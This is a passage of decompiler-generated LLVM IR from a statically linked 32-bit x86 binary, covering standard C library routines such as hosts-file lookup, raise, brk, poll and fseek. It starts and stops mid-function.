  %v2_8055eb1 = sext i8 %v2_8055eab83 to i32
  store i32 %v2_8055eb1, i32* @edx, align 4
  %v0_8055eb4 = load i32, i32* @global_var_805b298, align 8
  store i32 %v0_8055eb4, i32* @eax, align 4
  %v2_8055eb9 = mul nsw i32 %v2_8055eb1, 2
  %v3_8055eb9 = add i32 %v0_8055eb4, %v2_8055eb9
  %v4_8055eb9 = inttoptr i32 %v3_8055eb9 to i8*
  %v5_8055eb9 = load i8, i8* %v4_8055eb9, align 1
  %v6_8055eb9 = and i8 %v5_8055eb9, 32
  %v7_8055eb9 = icmp eq i8 %v6_8055eb9, 0
  %v1_8055ebd = icmp eq i1 %v7_8055eb9, false
  br i1 %v1_8055ebd, label %dec_label_pc_8055ea7, label %dec_label_pc_8055ebf

dec_label_pc_8055ebf:                             ; preds = %dec_label_pc_8055eb1
  %v10_8055ebf = icmp eq i8 %v2_8055eab83, 10
  br i1 %v10_8055ebf, label %dec_label_pc_8055ea7, label %dec_label_pc_8055ec4

dec_label_pc_8055ec4:                             ; preds = %dec_label_pc_8055ea7, %dec_label_pc_8055ebf, %dec_label_pc_8055eab.preheader
  %v0_8055ec8.lcssa = phi i32 [ %v0_8055e8b.lcssa, %dec_label_pc_8055eab.preheader ], [ %v0_8055ec881, %dec_label_pc_8055ebf ], [ %v1_8055eaa, %dec_label_pc_8055ea7 ]
  %v1_8055eab.lcssa = phi i8* [ %v1_8055eab75, %dec_label_pc_8055eab.preheader ], [ %v1_8055eab82, %dec_label_pc_8055ebf ], [ %v1_8055eab, %dec_label_pc_8055ea7 ]
  %v4_8055ec4 = add nuw nsw i32 %stack_var_-196.013, 1
  %v2_8055ec8 = load i8, i8* %v1_8055eab.lcssa, align 1
  %v3_8055ec8 = icmp eq i8 %v2_8055ec8, 0
  br i1 %v3_8055ec8, label %dec_label_pc_8055ed4, label %dec_label_pc_8055ecd

dec_label_pc_8055ecd:                             ; preds = %dec_label_pc_8055ec8.preheader, %dec_label_pc_8055ec4
  %v0_8055e82 = phi i32 [ %v0_8055ec8.lcssa, %dec_label_pc_8055ec4 ], [ %v0_8055e4a57, %dec_label_pc_8055ec8.preheader ]
  %stack_var_-196.013 = phi i32 [ %v4_8055ec4, %dec_label_pc_8055ec4 ], [ 0, %dec_label_pc_8055ec8.preheader ]
  %v7_8055ed2 = icmp sgt i32 %stack_var_-196.013, 4
  br i1 %v7_8055ed2, label %dec_label_pc_8055ed4, label %dec_label_pc_8055e7e

dec_label_pc_8055ed4:                             ; preds = %dec_label_pc_8055ec4, %dec_label_pc_8055ecd, %dec_label_pc_8055ec8.preheader
  %stack_var_-196.0.lcssa = phi i32 [ 0, %dec_label_pc_8055ec8.preheader ], [ %v4_8055ec4, %dec_label_pc_8055ec4 ], [ %stack_var_-196.013, %dec_label_pc_8055ecd ]
  store i32 %tmp, i32* @edi, align 4
  %v0_8055edb = load i32, i32* @esi, align 4
  store i32 ptrtoint ([11 x i8]* @global_var_805a5c7.558 to i32), i32* %stack_var_-216, align 4
  %v5_8055ee3 = call i32 @__GI_strcoll(i8* %v4_8055ee3, i32 ptrtoint ([11 x i8]* @global_var_805a5c7.558 to i32), i32 %v0_8055edb, i32 %v0_8055edb)
  store i32 %v5_8055ee3, i32* @eax, align 4
  store i32 1, i32* @esi, align 4
  %v1_8055ef0 = icmp eq i32 %v5_8055ee3, 0
  br i1 %v1_8055ef0, label %dec_label_pc_8055f18.preheader, label %dec_label_pc_8055f29

dec_label_pc_8055f18.preheader:                   ; preds = %dec_label_pc_8055ed4
  %v5_8055f1c90 = icmp sgt i32 %stack_var_-196.0.lcssa, 1
  br i1 %v5_8055f1c90, label %dec_label_pc_8055f1e.lr.ph, label %dec_label_pc_8055f29

dec_label_pc_8055f1e.lr.ph:                       ; preds = %dec_label_pc_8055f18.preheader
  %v0_8055f1e.pre = load i32, i32* @global_var_8061bf4.490, align 4
  br label %dec_label_pc_8055f1e

dec_label_pc_8055ef6:                             ; preds = %dec_label_pc_8055f1e
  %v2_8055ef9 = mul i32 %v1_8055ef991, 4
  %v4_8055ef9 = add i32 %v2_8055ef9, %v3_8055ef9
  %v5_8055ef9 = inttoptr i32 %v4_8055ef9 to i32*
  %v6_8055ef9 = load i32, i32* %v5_8055ef9, align 4
  %v1_8055f00 = inttoptr i32 %v6_8055ef9 to i8*
  %v2_8055f00 = call i32 @__GI_strdup(i8* %v1_8055f00)
  %v0_8055f05 = load i32, i32* @esi, align 4
  %v1_8055f05 = add i32 %v0_8055f05, 1
  store i32 %v1_8055f05, i32* @esi, align 4
  %v1_8055f06 = load i32, i32* @ebx, align 4
  %v2_8055f06 = mul i32 %v1_8055f06, 4
  %v3_8055f06 = add i32 %v2_8055f06, 134618088
  %v4_8055f06 = inttoptr i32 %v3_8055f06 to i32*
  store i32 %v2_8055f00, i32* %v4_8055f06, align 4
  %v0_8055f0d = load i32, i32* @ebx, align 4
  %v1_8055f0d = add i32 %v0_8055f0d, 1
  store i32 %v1_8055f0d, i32* @eax, align 4
  store i32 %v1_8055f0d, i32* @global_var_8061bf4.490, align 4
  %v0_8055f18.pre = load i32, i32* @esi, align 4
  %v5_8055f1c = icmp slt i32 %v0_8055f18.pre, %stack_var_-196.0.lcssa
  br i1 %v5_8055f1c, label %dec_label_pc_8055f1e, label %dec_label_pc_8055f29

dec_label_pc_8055f1e:                             ; preds = %dec_label_pc_8055f1e.lr.ph, %dec_label_pc_8055ef6
  %v0_8055f1e = phi i32 [ %v0_8055f1e.pre, %dec_label_pc_8055f1e.lr.ph ], [ %v1_8055f0d, %dec_label_pc_8055ef6 ]
  %v1_8055ef991 = phi i32 [ 1, %dec_label_pc_8055f1e.lr.ph ], [ %v0_8055f18.pre, %dec_label_pc_8055ef6 ]
  store i32 %v0_8055f1e, i32* @ebx, align 4
  %v7_8055f27 = icmp sgt i32 %v0_8055f1e, 2
  br i1 %v7_8055f27, label %dec_label_pc_8055f29, label %dec_label_pc_8055ef6

dec_label_pc_8055f29:                             ; preds = %dec_label_pc_8055f18.preheader, %dec_label_pc_8055ef6, %dec_label_pc_8055f1e, %dec_label_pc_8055ed4
  %v0_8055f29 = load i32, i32* @ebx, align 4
  store i32 ptrtoint ([7 x i8]* @global_var_805a5d2.559 to i32), i32* %stack_var_-216, align 4
  %v0_8055f30 = load i32, i32* @edi, align 4
  %v4_8055f31 = inttoptr i32 %v0_8055f30 to i8*
  %v5_8055f31 = call i32 @__GI_strcoll(i8* %v4_8055f31, i32 ptrtoint ([7 x i8]* @global_var_805a5d2.559 to i32), i32 %v0_8055f29, i32 %v0_8055f29)
  store i32 %v5_8055f31, i32* @eax, align 4
  %v1_8055f39 = icmp eq i32 %v5_8055f31, 0
  br i1 %v1_8055f39, label %dec_label_pc_8055f7b.preheader, label %dec_label_pc_8055f3d

dec_label_pc_8055f3d:                             ; preds = %dec_label_pc_8055f29
  %v0_8055f3d = load i32, i32* @ecx, align 4
  store i32 ptrtoint ([7 x i8]* @global_var_805a5d9.560 to i32), i32* %stack_var_-216, align 4
  %v0_8055f44 = load i32, i32* @edi, align 4
  %v4_8055f45 = inttoptr i32 %v0_8055f44 to i8*
  %v5_8055f45 = call i32 @__GI_strcoll(i8* %v4_8055f45, i32 ptrtoint ([7 x i8]* @global_var_805a5d9.560 to i32), i32 %v0_8055f3d, i32 %v0_8055f3d)
  %v1_8055f4d = icmp eq i32 %v5_8055f45, 0
  br i1 %v1_8055f4d, label %dec_label_pc_8055f7b.preheader, label %dec_label_pc_8055fbe.backedge

dec_label_pc_8055f7b.preheader:                   ; preds = %dec_label_pc_8055f29, %dec_label_pc_8055f3d
  %v0_8055f7b92 = load i32, i32* @global_var_8061bf8.553, align 8
  %tmp4594 = icmp slt i32 %v0_8055f7b92, 1
  %tmp4695 = icmp eq i1 %tmp4594, false
  br i1 %tmp4695, label %dec_label_pc_8055f53, label %dec_label_pc_8055f84

dec_label_pc_8055f53:                             ; preds = %dec_label_pc_8055f7b.preheader, %dec_label_pc_8055f53.dec_label_pc_8055f53_crit_edge
  %v0_8055f7b96 = phi i32 [ %v0_8055f7b, %dec_label_pc_8055f53.dec_label_pc_8055f53_crit_edge ], [ %v0_8055f7b92, %dec_label_pc_8055f7b.preheader ]
  %v1_8055f53 = add i32 %v0_8055f7b96, -1
  store i32 %v1_8055f53, i32* @global_var_8061bf8.553, align 8
  %v1_8055f5c = mul i32 %v1_8055f53, 4
  %v2_8055f5c = add i32 %v1_8055f5c, 134618072
  %v3_8055f5c = inttoptr i32 %v2_8055f5c to i32*
  %v4_8055f5c = load i32, i32* %v3_8055f5c, align 4
  %v1_8055f63 = call i32 @free(i32 %v4_8055f5c)
  %v0_8055f68 = load i32, i32* @global_var_8061bf8.553, align 8
  %v1_8055f70 = mul i32 %v0_8055f68, 4
  %v2_8055f70 = add i32 %v1_8055f70, ptrtoint (i32* @global_var_8061bd8.561 to i32)
  %v3_8055f70 = inttoptr i32 %v2_8055f70 to i32*
  store i32 0, i32* %v3_8055f70, align 4
  %v0_8055f7b = load i32, i32* @global_var_8061bf8.553, align 8
  %tmp45 = icmp slt i32 %v0_8055f7b, 1
  %tmp46 = icmp eq i1 %tmp45, false
  br i1 %tmp46, label %dec_label_pc_8055f53.dec_label_pc_8055f53_crit_edge, label %dec_label_pc_8055f84

dec_label_pc_8055f53.dec_label_pc_8055f53_crit_edge: ; preds = %dec_label_pc_8055f53
  br label %dec_label_pc_8055f53

dec_label_pc_8055f84:                             ; preds = %dec_label_pc_8055f53, %dec_label_pc_8055f7b.preheader
  %v0_8055f7b.lcssa = phi i32 [ %v0_8055f7b92, %dec_label_pc_8055f7b.preheader ], [ %v0_8055f7b, %dec_label_pc_8055f53 ]
  store i32 1, i32* @esi, align 4
  %v5_8055fb1100 = icmp sgt i32 %stack_var_-196.0.lcssa, 1
  br i1 %v5_8055fb1100, label %dec_label_pc_8055fb3, label %dec_label_pc_8055fbe.backedge

dec_label_pc_8055f8b:                             ; preds = %dec_label_pc_8055fb3
  %v2_8055f8e = mul i32 %v1_8055f8e102, 4
  %v4_8055f8e = add i32 %v2_8055f8e, %v3_8055ef9
  %v5_8055f8e = inttoptr i32 %v4_8055f8e to i32*
  %v6_8055f8e = load i32, i32* %v5_8055f8e, align 4
  %v1_8055f95 = inttoptr i32 %v6_8055f8e to i8*
  %v2_8055f95 = call i32 @__GI_strdup(i8* %v1_8055f95)
  %v0_8055f9a = load i32, i32* @esi, align 4
  %v1_8055f9a = add i32 %v0_8055f9a, 1
  store i32 %v1_8055f9a, i32* @esi, align 4
  %v1_8055f9b = load i32, i32* @ebx, align 4
  %v2_8055f9b = mul i32 %v1_8055f9b, 4
  %v3_8055f9b = add i32 %v2_8055f9b, 134618072
  %v4_8055f9b = inttoptr i32 %v3_8055f9b to i32*
  store i32 %v2_8055f95, i32* %v4_8055f9b, align 4
  %v0_8055fa2 = load i32, i32* @ebx, align 4
  %v1_8055fa2 = add i32 %v0_8055fa2, 1
  store i32 %v1_8055fa2, i32* @global_var_8061bf8.553, align 8
  %v0_8055fad.pre = load i32, i32* @esi, align 4
  %v5_8055fb1 = icmp slt i32 %v0_8055fad.pre, %stack_var_-196.0.lcssa
  br i1 %v5_8055fb1, label %dec_label_pc_8055fb3, label %dec_label_pc_8055fbe.backedge

dec_label_pc_8055fb3:                             ; preds = %dec_label_pc_8055f84, %dec_label_pc_8055f8b
  %v1_8055f8e102 = phi i32 [ %v0_8055fad.pre, %dec_label_pc_8055f8b ], [ 1, %dec_label_pc_8055f84 ]
  %v0_8055fb3101 = phi i32 [ %v1_8055fa2, %dec_label_pc_8055f8b ], [ %v0_8055f7b.lcssa, %dec_label_pc_8055f84 ]
  store i32 %v0_8055fb3101, i32* @ebx, align 4
  %v7_8055fbc = icmp sgt i32 %v0_8055fb3101, 3
  br i1 %v7_8055fbc, label %dec_label_pc_8055fbe.backedge, label %dec_label_pc_8055f8b

dec_label_pc_8055e4b.preheader:                   ; preds = %dec_label_pc_8055e4b.preheader.lr.ph, %dec_label_pc_8055fbe.backedge
  %v0_8055e4b.pre = load i32, i32* @ebx, align 4
  %v4_8055e4b.pre = load i32, i32* @ecx, align 4
  %v1_8055e4b51 = inttoptr i32 %v0_8055e4b.pre to i8*
  %v2_8055e4b52 = load i8, i8* %v1_8055e4b51, align 1
  %v3_8055e4b53 = zext i8 %v2_8055e4b52 to i32
  %v5_8055e4b54 = and i32 %v4_8055e4b.pre, -256
  %v6_8055e4b55 = or i32 %v3_8055e4b53, %v5_8055e4b54
  store i32 %v6_8055e4b55, i32* @ecx, align 4
  %v4_8055e4d56 = icmp eq i8 %v2_8055e4b52, 0
  br i1 %v4_8055e4d56, label %dec_label_pc_8055fbe.backedge, label %dec_label_pc_8055e55.lr.ph

dec_label_pc_8055e55.lr.ph:                       ; preds = %dec_label_pc_8055e4b.preheader
  %v0_8055e58.pre = load i32, i32* @global_var_805b298, align 8
  br label %dec_label_pc_8055e55

dec_label_pc_8055fda:                             ; preds = %dec_label_pc_8055fbe.backedge, %dec_label_pc_8055fbe.preheader
  %v0_8055fdd = load i32, i32* @ebp, align 4
  %v1_8055fde = inttoptr i32 %v0_8055fdd to i16*
  %v2_8055fde = call i32 @__GI_fclose(i16* %v1_8055fde)
  br label %dec_label_pc_8055ff3

dec_label_pc_8055fe8:                             ; preds = %dec_label_pc_8055e27
  %v0_8055fe8 = call i32 @__GI___h_errno_location()
  %v1_8055fed = inttoptr i32 %v0_8055fe8 to i32*
  store i32 3, i32* %v1_8055fed, align 4
  br label %dec_label_pc_8055ff3

dec_label_pc_8055ff3:                             ; preds = %entry, %dec_label_pc_8055fda, %dec_label_pc_8055fe8
  store i32 1, i32* %stack_var_-216, align 4
  store i32 %v2_8055de0, i32* @eax, align 4
  %v2_8055fff = call i32 @__pthread_return_void(i32 %v2_8055de0, i32 1)
  store i32 %v0_8055dcc, i32* @ebp, align 4
  ret i32 %v2_8055fff

; uselistorder directives
  uselistorder i32 %v0_8055e58.pre, { 1, 0 }
  uselistorder i32 %v6_8055e4b55, { 1, 0 }
  uselistorder i8 %v2_8055e4b52, { 1, 2, 0 }
  uselistorder i8* %v1_8055e4b51, { 1, 0 }
  uselistorder i32 %v0_8055e4b.pre, { 1, 0 }
  uselistorder i32 %v0_8055f7b, { 0, 2, 1 }
  uselistorder i32 %v1_8055f53, { 1, 0 }
  uselistorder i32 %v0_8055f1e, { 1, 0 }
  uselistorder i32 %v0_8055f18.pre, { 1, 0 }
  uselistorder i32 %stack_var_-196.0.lcssa, { 3, 1, 2, 0 }
  uselistorder i32 %stack_var_-196.013, { 0, 1, 3, 2, 4 }
  uselistorder i32 %v2_8055eb1, { 1, 0 }
  uselistorder i8 %v2_8055eab83, { 1, 0 }
  uselistorder i32 %v2_8055e92, { 1, 0 }
  uselistorder i8 %v2_8055e8c68, { 1, 0 }
  uselistorder i32 %v1_8055e8b, { 0, 2, 1, 3 }
  uselistorder i32 %v2_8055e55, { 1, 0 }
  uselistorder i32 %v1_8055e4a, { 1, 0, 2 }
  uselistorder i32 %v2_8055fc5, { 2, 3, 0, 1 }
  uselistorder i32 %v2_8055e33, { 1, 0 }
  uselistorder i32 %v2_8055e15, { 1, 0, 2 }
  uselistorder i32* %stack_var_-216, { 1, 3, 4, 5, 2, 0, 6, 7, 9, 8 }
  uselistorder i32 %tmp, { 1, 0 }
  uselistorder i32 ()* @__GI___h_errno_location, { 5, 4, 3, 2, 0, 1 }
  uselistorder i32 (i32)* @free, { 20, 17, 16, 15, 14, 13, 12, 11, 26, 25, 24, 23, 1, 10, 9, 8, 7, 6, 19, 18, 21, 4, 3, 22, 5, 2, 0 }
  uselistorder i32* @global_var_8061bf8.553, { 1, 2, 3, 4, 0, 5, 6, 7 }
  uselistorder i32 152, { 2, 1, 3, 4, 0 }
  uselistorder i8 10, { 0, 1, 2, 14, 3, 4, 5, 6, 7, 8, 15, 9, 16, 10, 11, 12, 13, 17 }
  uselistorder i32 164, { 2, 1, 0 }
  uselistorder i32* @global_var_8061bf4.490, { 1, 0, 2, 3 }
  uselistorder i32 ptrtoint (i32* @global_var_805b508.489 to i32), { 1, 3, 4, 5, 6, 7, 8, 0, 2, 9 }
  uselistorder label %dec_label_pc_8055ff3, { 2, 1, 0 }
  uselistorder label %dec_label_pc_8055e4b.preheader, { 1, 0 }
  uselistorder label %dec_label_pc_8055fb3, { 1, 0 }
  uselistorder label %dec_label_pc_8055f53, { 1, 0 }
  uselistorder label %dec_label_pc_8055f7b.preheader, { 1, 0 }
  uselistorder label %dec_label_pc_8055f29, { 2, 1, 0, 3 }
  uselistorder label %dec_label_pc_8055f1e, { 1, 0 }
  uselistorder label %dec_label_pc_8055ed4, { 1, 0, 2 }
  uselistorder label %dec_label_pc_8055ecd, { 1, 0 }
  uselistorder label %dec_label_pc_8055ec4, { 1, 0, 2 }
  uselistorder label %dec_label_pc_8055eb1, { 1, 0 }
  uselistorder label %dec_label_pc_8055e92, { 1, 0 }
  uselistorder label %dec_label_pc_8055fbe.backedge, { 0, 3, 4, 2, 7, 6, 5, 1 }
  uselistorder label %dec_label_pc_8055fbe.preheader, { 1, 0 }
}

define i32 @__get_hosts_byname_r(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7) local_unnamed_addr {
entry:
  %v9_8056033 = inttoptr i32 %arg3 to i32*
  %v10_8056033 = call i32 @__read_etc_hosts_r(i32 0, i32 %arg1, i32 %arg2, i32 0, i32* %v9_8056033, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7)
  ret i32 %v10_8056033
}

define i32 @__raise(i32 %arg1) local_unnamed_addr {
entry:
  %v0_805603f = call i32 @__libc_getpid()
  %v2_805604b = call i32 @kill(i32 %v0_805603f, i32 %arg1)
  ret i32 %v2_805604b

; uselistorder directives
  uselistorder i32 (i32, i32)* @kill, { 0, 3, 2, 1 }
  uselistorder i32 ()* @__libc_getpid, { 0, 3, 2, 1 }
}

define i32 @_dl_aux_init() local_unnamed_addr {
entry:
  %v0_8056054 = load i32, i32* @eax, align 4
  %v1_8056054 = add i32 %v0_8056054, 28
  %v2_8056054 = inttoptr i32 %v1_8056054 to i32*
  %v3_8056054 = load i32, i32* %v2_8056054, align 4
  store i32 %v3_8056054, i32* @global_var_8061bfc.562, align 4
  %v1_805605d = add i32 %v0_8056054, 44
  %v2_805605d = inttoptr i32 %v1_805605d to i32*
  %v3_805605d = load i32, i32* %v2_805605d, align 4
  store i32 %v3_805605d, i32* @global_var_8061c00.563, align 1024
  ret i32 %v3_805605d
}

define i32 @__GI_brk(i32 %arg1) local_unnamed_addr {
entry:
  %ecx.global-to-local = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_8056068 = load i32, i32* @ebx, align 4
  store i32 %v0_8056068, i32* %stack_var_-4, align 4
  store i32 %arg1, i32* %ecx.global-to-local, align 4
  %v1_805607b = call i32 @int80_syscall(i32 45)
  store i32 0, i32* %ecx.global-to-local, align 4
  store i32 %v1_805607b, i32* @global_var_80617c4.540, align 4
  %v7_8056086 = icmp ult i32 %v1_805607b, %arg1
  %v1_8056088 = icmp eq i1 %v7_8056086, false
  br i1 %v1_8056088, label %dec_label_pc_8056098, label %dec_label_pc_805608a

dec_label_pc_805608a:                             ; preds = %entry
  %v0_805608a = load i32, i32* %stack_var_-4, align 4
  %v1_805608a = call i32 @__errno_location(i32 %v0_805608a)
  store i32 -1, i32* %ecx.global-to-local, align 4
  %v1_8056092 = inttoptr i32 %v1_805608a to i32*
  store i32 12, i32* %v1_8056092, align 4
  %v0_8056098.pre = load i32, i32* %ecx.global-to-local, align 4
  br label %dec_label_pc_8056098

dec_label_pc_8056098:                             ; preds = %entry, %dec_label_pc_805608a
  %v0_8056098 = phi i32 [ 0, %entry ], [ %v0_8056098.pre, %dec_label_pc_805608a ]
  %v2_805609c = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_805609c, i32* @ebx, align 4
  ret i32 %v0_8056098

; uselistorder directives
  uselistorder i32 %v1_805607b, { 1, 0 }
  uselistorder i32* %stack_var_-4, { 1, 0, 2 }
  uselistorder i32* @global_var_80617c4.540, { 1, 0, 2 }
  uselistorder label %dec_label_pc_8056098, { 1, 0 }
}

define i32 @__libc_poll() local_unnamed_addr {
entry:
  %edi.global-to-local = alloca i32, align 4
  %tmp = call i32 @__decompiler_undefined_function_0()
  %tmp3 = call i32 @__decompiler_undefined_function_0()
  %tmp4 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-4 = alloca i32, align 4
  %v0_80560a0 = load i32, i32* @edi, align 4
  store i32 %v0_80560a0, i32* %stack_var_-4, align 4
  store i32 %tmp4, i32* %edi.global-to-local, align 4
  %v0_80560b0 = load i32, i32* @ebx, align 4
  %v1_80560b1 = inttoptr i32 %tmp4 to %pollfd*
  %v5_80560b8 = call i32 @poll(%pollfd* %v1_80560b1, i32 %tmp3, i32 %tmp)
  store i32 %v0_80560b0, i32* @ebx, align 4
  store i32 %v5_80560b8, i32* %edi.global-to-local, align 4
  %tmp10 = icmp ult i32 %v5_80560b8, -4095
  br i1 %tmp10, label %dec_label_pc_80560d0, label %dec_label_pc_80560c4

dec_label_pc_80560c4:                             ; preds = %entry
  %v1_80560c4 = call i32 @__errno_location(i32 %v0_80560b0)
  %v0_80560c9 = load i32, i32* %edi.global-to-local, align 4
  %v1_80560c9 = sub i32 0, %v0_80560c9
  %v2_80560cb = inttoptr i32 %v1_80560c4 to i32*
  store i32 %v1_80560c9, i32* %v2_80560cb, align 4
  store i32 -1, i32* %edi.global-to-local, align 4
  br label %dec_label_pc_80560d0

dec_label_pc_80560d0:                             ; preds = %entry, %dec_label_pc_80560c4
  %v0_80560d0 = phi i32 [ %v5_80560b8, %entry ], [ -1, %dec_label_pc_80560c4 ]
  %v2_80560d4 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_80560d4, i32* @edi, align 4
  ret i32 %v0_80560d0

; uselistorder directives
  uselistorder i32 %v5_80560b8, { 1, 0, 2 }
  uselistorder i32 %v0_80560b0, { 1, 0 }
  uselistorder label %dec_label_pc_80560d0, { 1, 0 }
}

define i32 @__GI_fseek(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %v1_80560e3 = ashr i32 %arg2, 31
  %v4_80560ea = inttoptr i32 %arg1 to i16*
  %v5_80560ea = call i32 @__GI_fseeko64(i16* %v4_80560ea, i32 %arg2, i32 %v1_80560e3, i32 %arg3)
  ret i32 %v5_80560ea
}

define i32 @__GI_fseeko64(i16* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-28 = alloca i32, align 4
  %stack_var_-44 = alloca i32, align 4
  %v0_80560f4 = load i32, i32* @ebp, align 4
  %v0_80560f5 = load i32, i32* @edi, align 4
  %v0_80560f6 = load i32, i32* @esi, align 4
  %v0_80560f7 = load i32, i32* @ebx, align 4
  store i32 %arg4, i32* @edi, align 4
  store i32 %arg2, i32* %eax.global-to-local, align 4
  store i32 %arg3, i32* @edx, align 4
  %v4_8056107 = ptrtoint i16* %arg1 to i32
  store i32 %v4_8056107, i32* @esi, align 4
  store i32 %arg2, i32* %stack_var_-28, align 4
  %tmp28 = icmp ult i32 %arg4, 3
  br i1 %tmp28, label %dec_label_pc_805612b, label %dec_label_pc_8056118

dec_label_pc_8056118:                             ; preds = %entry
  %v1_8056118 = call i32 @__errno_location(i32 %arg2)
  store i32 %v1_8056118, i32* %eax.global-to-local, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  %v1_8056120 = inttoptr i32 %v1_8056118 to i32*
  store i32 22, i32* %v1_8056120, align 4
  br label %dec_label_pc_80561cd

dec_label_pc_805612b:                             ; preds = %entry
  %v1_805612b = add i32 %v4_8056107, 52
  %v2_805612b = inttoptr i32 %v1_805612b to i32*
  %v3_805612b = load i32, i32* %v2_805612b, align 4
  %v1_805612e = icmp eq i32 %v3_805612b, 0
  %v1_8056130 = icmp eq i1 %v1_805612e, false
  br i1 %v1_8056130, label %dec_label_pc_8056151, label %dec_label_pc_8056132

dec_label_pc_8056132:                             ; preds = %dec_label_pc_805612b
  %v1_8056132 = add i32 %v4_8056107, 56
  store i32 %v1_8056132, i32* @ebx, align 4
  %v2_805613c = ptrtoint i32* %stack_var_-44 to i32
  store i32 %v2_805613c, i32* @eax, align 4
  %v3_8056141 = call i32 @__pthread_return_void(i32 %v2_805613c, i32 134562611)
  store i32 %v3_8056141, i32* %eax.global-to-local, align 4
  %v0_8056146 = load i32, i32* @ebx, align 4
  %v2_8056149 = call i32 @__pthread_return_0(i32 %v0_8056146)
  store i32 %v2_8056149, i32* %eax.global-to-local, align 4
  %v0_8056151.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_8056151

dec_label_pc_8056151:                             ; preds = %dec_label_pc_805612b, %dec_label_pc_8056132
  %v0_8056159 = phi i32 [ %v4_8056107, %dec_label_pc_805612b ], [ %v0_8056151.pre, %dec_label_pc_8056132 ]
  %v1_8056151 = inttoptr i32 %v0_8056159 to i8*
  %v2_8056151 = load i8, i8* %v1_8056151, align 1
  %v3_8056151 = and i8 %v2_8056151, 64
  %v4_8056151 = icmp eq i8 %v3_8056151, 0
  br i1 %v4_8056151, label %dec_label_pc_8056166, label %dec_label_pc_8056156

dec_label_pc_8056156:                             ; preds = %dec_label_pc_8056151
  %v2_805615a = call i32 @__stdio_wcommit(i32 %v0_8056159)
  store i32 %v2_805615a, i32* %eax.global-to-local, align 4
  %v1_8056162 = icmp eq i32 %v2_805615a, 0
  %v1_8056164 = icmp eq i1 %v1_8056162, false
  br i1 %v1_8056164, label %dec_label_pc_80561b5, label %dec_label_pc_8056166

dec_label_pc_8056166:                             ; preds = %dec_label_pc_8056156, %dec_label_pc_8056151
  %v0_8056166 = load i32, i32* @edi, align 4
  %v9_8056166 = icmp eq i32 %v0_8056166, 1
  %v1_8056169 = icmp eq i1 %v9_8056166, false
  br i1 %v1_8056169, label %dec_label_pc_8056166.dec_label_pc_805617f_crit_edge, label %dec_label_pc_805616b

dec_label_pc_8056166.dec_label_pc_805617f_crit_edge: ; preds = %dec_label_pc_8056166
  %.pre6 = ptrtoint i32* %stack_var_-28 to i32
  br label %dec_label_pc_805617f

dec_label_pc_805616b:                             ; preds = %dec_label_pc_8056166
  %v0_805616b = load i32, i32* @ecx, align 4
  %v2_805616d = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_805616d, i32* %eax.global-to-local, align 4
  %v0_8056172 = load i32, i32* @esi, align 4
  %tmp26 = inttoptr i32 %v0_8056172 to i32*
  %v6_8056173 = call i32 @__stdio_adjust_position(i32* %tmp26, i32 %v2_805616d, i32 %v0_805616b, i32 %v0_805616b)
  store i32 %v6_8056173, i32* %eax.global-to-local, align 4
  %v2_805617b = icmp slt i32 %v6_8056173, 0
  br i1 %v2_805617b, label %dec_label_pc_80561b5, label %dec_label_pc_805616b.dec_label_pc_805617f_crit_edge

dec_label_pc_805616b.dec_label_pc_805617f_crit_edge: ; preds = %dec_label_pc_805616b
  %v0_8056180.pre = load i32, i32* @edi, align 4
  br label %dec_label_pc_805617f

dec_label_pc_805617f:                             ; preds = %dec_label_pc_8056166.dec_label_pc_805617f_crit_edge, %dec_label_pc_805616b.dec_label_pc_805617f_crit_edge
  %v2_8056181.pre-phi = phi i32 [ %.pre6, %dec_label_pc_8056166.dec_label_pc_805617f_crit_edge ], [ %v2_805616d, %dec_label_pc_805616b.dec_label_pc_805617f_crit_edge ]
  %v0_8056180 = phi i32 [ %v0_8056166, %dec_label_pc_8056166.dec_label_pc_805617f_crit_edge ], [ %v0_8056180.pre, %dec_label_pc_805616b.dec_label_pc_805617f_crit_edge ]
  %v0_805617f = load i32, i32* @edx, align 4
  store i32 %v2_8056181.pre-phi, i32* %eax.global-to-local, align 4
  %v0_8056186 = load i32, i32* @esi, align 4
  %v5_8056187 = inttoptr i32 %v2_8056181.pre-phi to i32*
  %v6_8056187 = call i32 @__stdio_seek(i32 %v0_8056186, i32* %v5_8056187, i32 %v0_8056180, i32 %v0_805617f)
  store i32 %v6_8056187, i32* %eax.global-to-local, align 4
  %v2_805618f = icmp slt i32 %v6_8056187, 0
  br i1 %v2_805618f, label %dec_label_pc_80561b5, label %dec_label_pc_8056193

dec_label_pc_8056193:                             ; preds = %dec_label_pc_805617f
  %v0_8056193 = load i32, i32* @esi, align 4
  %v1_8056193 = inttoptr i32 %v0_8056193 to i16*
  %v2_8056193 = load i16, i16* %v1_8056193, align 2
  %v3_8056193 = and i16 %v2_8056193, -72
  store i16 %v3_8056193, i16* %v1_8056193, align 2
  %v0_8056197 = load i32, i32* @esi, align 4
  %v1_8056197 = add i32 %v0_8056197, 8
  %v2_8056197 = inttoptr i32 %v1_8056197 to i32*
  %v3_8056197 = load i32, i32* %v2_8056197, align 4
  store i32 %v3_8056197, i32* %eax.global-to-local, align 4
  store i32 0, i32* %ebx.global-to-local, align 4
  %v2_805619c = add i32 %v0_8056197, 16
  %v3_805619c = inttoptr i32 %v2_805619c to i32*
  store i32 %v3_8056197, i32* %v3_805619c, align 4
  %v0_805619f = load i32, i32* %eax.global-to-local, align 4
  %v1_805619f = load i32, i32* @esi, align 4
  %v2_805619f = add i32 %v1_805619f, 20
  %v3_805619f = inttoptr i32 %v2_805619f to i32*
  store i32 %v0_805619f, i32* %v3_805619f, align 4
  %v0_80561a2 = load i32, i32* %eax.global-to-local, align 4
  %v1_80561a2 = load i32, i32* @esi, align 4
  %v2_80561a2 = add i32 %v1_80561a2, 24
  %v3_80561a2 = inttoptr i32 %v2_80561a2 to i32*
